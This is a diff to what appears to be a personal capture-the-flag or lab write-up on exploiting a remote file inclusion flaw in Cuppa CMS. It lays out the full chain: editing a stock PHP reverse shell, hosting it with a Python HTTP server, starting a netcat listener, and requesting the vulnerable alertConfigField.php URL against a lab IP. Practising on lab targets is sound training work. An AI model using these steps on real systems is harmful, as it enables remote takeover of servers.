@@ -353,5 +353,44 @@ cat /usr/share/exploitdb/exploits/exploit_path.txt
 ![[Pasted image 20251022192842.png]]
 ![[Pasted image 20251022193334.png]]
 
-# Exploitin 
-We are going to exploit the file inclusion vulnerability and to 
+# Exploiting File Inclusion
+We are going to exploit the file inclusion vulnerability and to do so we are going to create a php reverse shell
+
+We are going to do the following: 
+1. Setup a php reverse shell (/usr/share/webshells/php/php_shell)
+	1. Modify the IP address and port
+2. Host the PHP Payload (Use Python3 Http.server)
+3. Setup the listener (Netcat)
+4. Exploit the RFI to obtain the reverse shell
+
+## Setup PHP reverse shell
+We can navigate to the directory /usr/share/webshells/php
+Then we copy the php payload and change to IP address and Port to our LHOST and LPORT
+![[Pasted image 20251022193850.png]]
+
+Modify it with nano
+![[Pasted image 20251022193952.png]]
+
+## Setup Python HTTP Webserver
+```
+python3 -m http.server 8080
+```
+
+## Setup Netcat Listener 
+```
+nc -nvlp 8888
+```
+
+The port is what you specified for LPORT of the PHP Payload
+
+## Exploit the Remote File Inclusion within the webpage using the link 
+
+use the following payload to exploit and change the values 
+```
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+```
+
+The final command will be as followed: 
+```
+http://10.10.116.36/45kra24zxs28v3yd/administrator/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+```
